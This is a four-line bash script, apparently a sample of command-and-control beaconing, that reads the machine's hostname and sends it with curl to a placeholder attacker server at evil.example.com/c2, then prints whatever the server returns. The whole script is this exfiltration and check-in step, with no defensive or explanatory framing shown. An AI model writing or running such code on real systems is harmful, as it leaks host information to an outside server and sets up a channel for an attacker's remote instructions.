#!/bin/bash
HOSTNAME=`hostname`
RESULT=`curl http://evil.example.com/c2 -d "$HOSTNAME"`
echo "$RESULT"
